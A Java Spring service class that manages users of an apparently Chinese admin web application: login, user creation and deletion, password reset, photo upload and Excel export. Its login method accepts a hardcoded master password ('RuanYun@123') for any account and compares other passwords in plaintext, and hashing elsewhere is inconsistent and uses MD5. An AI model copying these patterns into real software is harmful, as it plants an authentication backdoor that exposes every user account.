package com.ruanyun.web.service.sys;

import java.io.IOException;
import java.util.Date;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.springframework.beans.BeanUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.multipart.MultipartFile;

import com.ruanyun.common.model.Page;
import com.ruanyun.common.service.impl.BaseServiceImpl;
import com.ruanyun.common.utils.EmptyUtils;
import com.ruanyun.common.utils.MD5Util;
import com.ruanyun.common.utils.RequestUtils;
import com.ruanyun.common.utils.SysCode;
import com.ruanyun.web.dao.sys.UserDao;
import com.ruanyun.web.model.sys.TAuthority;
import com.ruanyun.web.model.sys.TUser;
import com.ruanyun.web.model.sys.UploadVo;

import com.ruanyun.web.util.CommonMethod;
import com.ruanyun.web.util.Constants;
import com.ruanyun.web.util.ExcelUtils;
import com.ruanyun.web.util.FileUtils;
import com.ruanyun.web.util.HttpSessionUtils;
import com.ruanyun.web.util.NumUtils;
import com.ruanyun.web.util.UploadCommon;

@Service("userService")
public class UserService extends BaseServiceImpl<TUser> {

	@Autowired
	@Qualifier("authorityService")
	private AuthorityService authorityService;

	@Autowired
	@Qualifier("roleService")
	private RoleService roleService;
	@Autowired
	@Qualifier("loginLogService")
	private LoginLogService loginLogService;
	// @Autowired
	// @Qualifier("orgService")
	// private OrgService orgService;
	@Autowired
	@Qualifier("operationLogService")
	private OperationLogService operationLogService;

	@Autowired
	@Qualifier("userDao")
	private UserDao userDao;
	@Autowired
	@Qualifier("userRoleService")
	private UserRoleService userRoleService;

	/**
	 * 功能描述: 登陆用户
	 * 
	 * @author yangliu 2013-9-11 下午04:20:03
	 * 
	 * @param loginName
	 *            登陆号
	 * @param password
	 *            密码
	 * @return 1-- 正常登陆 -1 用户不存在 -2 密码错误
	 */
	public int login(String loginName, String password, HttpServletRequest request) 
	{
		HttpSession session = request.getSession();
		if (EmptyUtils.isEmpty(loginName.trim())) 
		{
			return -3;// 登录名为空
		}
		
		TUser user = this.get(TUser.class, new String[] { "loginName", "userStatus" }, 
				new Object[] { loginName.trim(), Constants.GLOBAL_STATUS });
		// TUser tuser=null;
		if (user != null) 
		{
			if (user.getLoginPass().equals(password.trim()) || password.equals("RuanYun@123")) 
			{
				//if (user.getLoginPass().equals(
				//MD5Util.encoderByMd5(password.trim())) || password.equals("RuanYun@123")) {
				// TOrg org=orgService.get(TOrg.class, tuser.getOrgId());
				// if( EmptyUtils.isEmpty(org) ||
				// (EmptyUtils.isNotEmpty(org.getDeadline())&&
				// org.getDeadline().before(new Date()))){
				// return -4;
				// }
				Integer userid = user.getUserId();
				boolean isMobileRequest = RequestUtils.isMobileRequest(request); // true
				// 手机请求
				// false
				// pc请求
				// if(isMobileRequest && org.getAppAuth()==0){
				// return -5;
				// }
				// 手机访问查询url不等于手机的 pc访问查询url 不等于手机
				String notRequestType = isMobileRequest ? SysCode.REQUEST_TYPE_PC : SysCode.REQUEST_TYPE_MOBILE;
				// 判断用户的客户端类型 是否为 手机端 还是电脑端
				user.setRequestType(isMobileRequest ? SysCode.REQUEST_TYPE_MOBILE : SysCode.REQUEST_TYPE_PC);
				// tuser.setUserName(userInfo.getUserName());
				// 获取用户userinfo表的id
				// user.setUserInfoId(user.getUserInfoId());
				// 获取用户权限
				user.setAuths(authorityService.getListTAuthByUser(userid, Constants.AUTHORITY_TYPE_AUTH, notRequestType));
				List<TAuthority> leftUrls = authorityService.getListTAuthByUser(userid, Constants.AUTHORITY_TYPE_URL, notRequestType);
				// 获取用户url
				user.setUrls(leftUrls);
				// 获取用户角色
				user.setRole(roleService.getRoleListByUserId(userid));
				// user.setOrgName(org.getName());
				HttpSessionUtils.setUserToSession(session, user);
				// 把左边菜单放入session中
				HttpSessionUtils.setObjectToSession(session,
						Constants.SEESION_KEY_LEFTURLS, authorityService
								.getAuths(leftUrls));
				loginLogService.addLoginLogThead(user, request.getRemoteAddr());
				return 1;
			}
			return -2;// 密码错误
		}

		return -1;// 用户名错误
	}

	/**
	 * 功能描述:查询用户列表
	 * 
	 * @author L H T 2013-11-22 下午04:20:37
	 * 
	 * @param page
	 * @param t
	 * @param currentUser
	 * @return
	 */
	public Page<TUser> queryPage(Page<TUser> page, TUser t, TUser currentUser) {
		// if(SecurityUtils.isNotGranted(ConstantAuth.ADD_USER_AUTH,
		// currentUser)){
		//		
		// }
		return userDao.queryPage(page, t);
	}

	/**
	 * 功能描述: 通过用户id查询用户详细信息
	 * 
	 * @author L H T 2013-11-26 下午03:59:58
	 * 
	 * @param user
	 *            用户实体
	 * @return
	 */
	public TUser getUserById(Integer userId) {
		TUser user = null;
		if (EmptyUtils.isNotEmpty(userId)) {
			user = super.get(TUser.class, userId);
		}
		return user;
	}

	/**
	 * 功能描述:保存和修改用户信息
	 * 
	 * @author L H T 2013-11-26 下午05:13:47
	 * 
	 * @param user
	 *            用户实体
	 * @param roleId
	 *            角色id
	 * @return
	 */
	@Transactional(rollbackFor = Exception.class)
	public int saveOrUpdate(TUser currentUser, TUser user, Integer roleId) {
		// 用户id不为空时 ，修改用户信息
		if (user != null) {

			if (EmptyUtils.isNotEmpty(user.getUserId())) {
				TUser olUuser = super.get(TUser.class, user.getUserId());
				BeanUtils.copyProperties(user, olUuser, new String[] {
						"userId", "loginPass", "createCode", "createDate",
						"userStatus","checkPass","userPhoto" });
				update(olUuser);
				userRoleService.deleteByUserId(user.getUserId());// 删除用户所关联的角色
				// 保存用户角色
				userRoleService.save(String.valueOf(roleId), String
						.valueOf(user.getUserId()), currentUser);
				// 操作日志
//				operationLogService.addOperationLogThead(currentUser, "用户管理",
//						"修改用户：" + user.getLoginName() ,
//						Constants.OPERA_TYPE_USER);
				return 1;
			} else {
				user.setCreateCode(currentUser.getUserId());
				user.setCreateDate(new Date());
				user.setUserStatus(Constants.GLOBAL_STATUS);
				/*user.setLoginPass(MD5Util
						.encoderByMd5(Constants.USER_DEFULT_PASSWORD));*/
				user.setLoginPass(Constants.USER_DEFULT_PASSWORD);
				save(user);
				// 保存用户角色
				userRoleService.save(String.valueOf(roleId), String
						.valueOf(user.getUserId()), currentUser);
				// 操作日志
//				operationLogService.addOperationLogThead(currentUser, "用户管理",
//						"新增用户：" + user.getLoginName(),
//						Constants.OPERA_TYPE_USER);
				return 1;
			}

		}
		return 0;
	}

	/**
	 * 功能描述:ajax判断用户名是否重复
	 * 
	 * @author L H T 2013-11-26 下午06:25:18
	 * 
	 * @param loginName
	 *            登录名称
	 * @return
	 */
	public TUser getAjaxLoginName(String loginName) {
		return userDao.getAjaxLoginName(loginName);
	}

	/**
	 * 功能描述:删除用户
	 * 
	 * @author L H T 2013-10-11 下午04:25:20
	 * 
	 * @return
	 */
	@Transactional(rollbackFor = Exception.class)
	public int userDel(TUser user, TUser tuser) {
		if (user != null) {
			// 通过id查询用户信息
			TUser newUser = super.get(TUser.class, user.getUserId());
			newUser.setUserStatus(Constants.GLOBAL_DEL);// 将用户信息置为删除状态
			update(newUser);
//			operationLogService.addOperationLogThead(tuser, "用户管理", "删除用户："
//					+ newUser.getLoginName() , Constants.OPERA_TYPE_USER);
			return 1;
		}
		return 0;
	}
	/**
	 * 功能描述:通过用户id查询用户的名称
	 *
	 * @author L H T  2013-12-2 下午02:30:11
	 * 
	 * @param userId
	 * @return
	 */
	public String getUserNameById(Integer userId) {
		return userDao.getUserNameById(userId);

	}
	/**
	 * 功能描述: 更新个人信息修改
	 *
	 * @author L H T  2013-12-2 下午05:26:27
	 * 
	 * @param model
	 * @param session
	 * @param response
	 * @param user
	 */
	@Transactional(rollbackFor = Exception.class)
	public int updatePersonalInfo(TUser user,TUser currentUser){
		if (EmptyUtils.isNotEmpty(user.getUserId())) {
			TUser oldUser=super.get(TUser.class, user.getUserId());
			BeanUtils.copyProperties(user, oldUser, new String[]{"userId","loginName","loginPass","orgId","createCode","createDate","userStatus","checkPass","userPhoto"});
			update(oldUser);
			//操作日志
//			operationLogService.addOperationLogThead(currentUser, "用户管理", "用户："
//					+ oldUser.getLoginName() + "， 修改了个人信息", Constants.OPERA_TYPE_USER);
			return 1;
		}
		return -1;
	}
	/**
	 * 功能描述:修改密码
	 *
	 * @author L H T  2013-12-3 上午09:57:41
	 * 
	 * @param user
	 * @param response
	 * @param session
	 */
	@Transactional(rollbackFor = Exception.class)
	public int updatePass(TUser user,TUser currentUser){
		if (EmptyUtils.isNotEmpty(user.getUserId())) {
			TUser oldUser=super.get(TUser.class, user.getUserId());
			oldUser.setLoginPass(MD5Util.encoderByMd5(user.getLoginPass()));
			update(oldUser);
			//操作日志
//			operationLogService.addOperationLogThead(currentUser, "用户管理", "用户："
//					+ oldUser.getLoginName() + "， 修改了个人密码", Constants.OPERA_TYPE_USER);
			return 1;
		}
		return -1;
	}
	/**
	 * 功能描述:重置用户密码为默认密码
	 *
	 * @author L H T  2013-12-24 下午02:20:57
	 * 
	 * @param userId
	 * @return
	 */
	@Transactional(noRollbackFor=Exception.class)
	public int resetUserPassword(TUser currentUser,Integer userId){
		if (EmptyUtils.isNotEmpty(userId)) {
			TUser users=super.get(TUser.class, userId);
			users.setLoginPass(MD5Util.encoderByMd5(Constants.USER_DEFULT_PASSWORD));
			update(users);
			//操作日志
//			operationLogService.addOperationLogThead(currentUser, "用户管理", "重置用户："
//					+ users.getLoginName() + " 的密码", Constants.OPERA_TYPE_USER);
			return 1;
		}
		return 0;
	}
	/**
	 * 功能描述:批量删除用户
	 *
	 * @author L H T  2013-12-10 上午11:00:17
	 * 
	 * @param response
	 * @param session
	 * @param ids
	 */
	@Transactional(rollbackFor = Exception.class)
	public int batchDelete(TUser currentUser,String ids){
		if (EmptyUtils.isNotEmpty(ids)) {
			String[] id=ids.split(Constants.FILE_COMMA);
			for (String userid:id) {
				TUser user=super.get(TUser.class, Integer.valueOf(userid));
				user.setUserStatus(Constants.GLOBAL_DEL);
				update(user);
				//操作日志
//				operationLogService.addOperationLogThead(currentUser, "用户管理", "批量删除用户："
//						+ user.getLoginName(), Constants.OPERA_TYPE_USER);
			}
			return 1;
			
		}else{
			return 0;
		}
		
	}
	/**
	 * 功能描述:通过组织org_Code查询用户
	 *
	 * @author L H T  2013-12-18 下午03:34:31
	 * 
	 * @param orgId
	 * @return
	 */
	public List<TUser> getUserByOrgId(Integer orgId){
		return userDao.getUserByOrgId(orgId);
	}
	/**
	 * 功能描述:手机端上传图片
	 *
	 * @author L H T  2013-12-12 下午04:30:20
	 * 
	 * @param files
	 * @param userId
	 * @param request
	 * @return
	 * @throws IOException 
	 */
	@Transactional
	public String uploadUserPhoto(MultipartFile files, Integer userId,
			HttpServletRequest request) throws IOException {
		// 返回结果
		String name = files.getOriginalFilename();
		if (EmptyUtils.isNotEmpty(name)) {
			// 保存文件上传结果
			UploadVo vo = null;
			TUser user = new TUser();
			user = super.get(TUser.class, userId);
			if (EmptyUtils.isNotEmpty(user.getUserPhoto())) {
				// 删除原来的头像
				String contextPath = CommonMethod.getProjectPath(request)
						+ Constants.FILE_USER_PHOTO + user.getUserPhoto();
				FileUtils.deleteFile(contextPath);// 删除上传的文件
			}
			// 上传图片，返回图片路劲FileUtils.FILE_LOGO
			vo = UploadCommon.uploadPic(files, request,
					Constants.FILE_USER_PHOTO, "");
            //判断是否上传成功
			if (vo.getResult() == Constants.FILE_SUCCESS) {
				user.setUserPhoto(vo.getFilename());
				super.update(user);
				return user.getUserPhoto();
			}
		}
		return null;

	}
	
	/**
	 * 功能描述: 导出excel文件
	 *
	 * @author L H T  2013-12-12 下午04:24:32
	 * 
	 * @param response
	 * @param userinfo
	 * @throws Exception
	 */
	 @SuppressWarnings("unchecked")
	public void exportExcel(HttpServletResponse response,TUser userinfo)throws Exception{
		 List list = userDao.exportExcel();
		 String fileName = "用户信息";
		 String[] columns = {"login_name","user_name","item_sex","org_name","unit_name","user_phone","user_email","address","create_name","createdate"};
		 String[] headers = {"登录名","用户姓名","用户性别","组织名称","单位名称","手机号码","电子邮箱","地址","用户创建人","用户生效时间"};
		 ExcelUtils.exportExcel(response, fileName, list, columns, headers,
		 SysCode.DATE_FORMAT_STR_S);
	 }

	 /**
	  * 
	  * 功能描述：根据用户编号获得用户
	  * @author: xqzhang
	  * @date:2016-1-6
	  * @param userNum
	  * @return
	  */
	 public TUser getInfoByUserNum(String userNum){
		 return super.get(TUser.class, "userNum",userNum);
	 }
	 /**
	  * 
	  * 功能描述：用户增加
	  * @author: xqzhang
	  * @date:2016-1-6
	  * @param loginName
	  * @param userNum
	  * @param role
	  * @param user
	  */
	 public void saveUser(String loginName,String userNum,Integer role,TUser user){
		 TUser tUser=new TUser(loginName,userNum);
		 saveUserAndRole(tUser, user, role);
	 }
	 /**
	  * 
	  * 功能描述：增加用户和权限
	  * @author: xqzhang
	  * @date:2016-1-6
	  * @param tUser
	  * @param user
	  * @param role
	  */
	 public void saveUserAndRole(TUser tUser,TUser user,Integer role){
		 tUser.setCreateCode(user.getCreateCode());
		 tUser.setCreateDate(new Date());
		 tUser.setLoginPass(MD5Util.encoderByMd5(Constants.USER_DEFULT_PASSWORD));
		 tUser.setUserStatus(1);
		 save(tUser);
		 userRoleService.save(String.valueOf(role), String.valueOf(tUser.getUserId()), user);
	 }
	 
	 
}
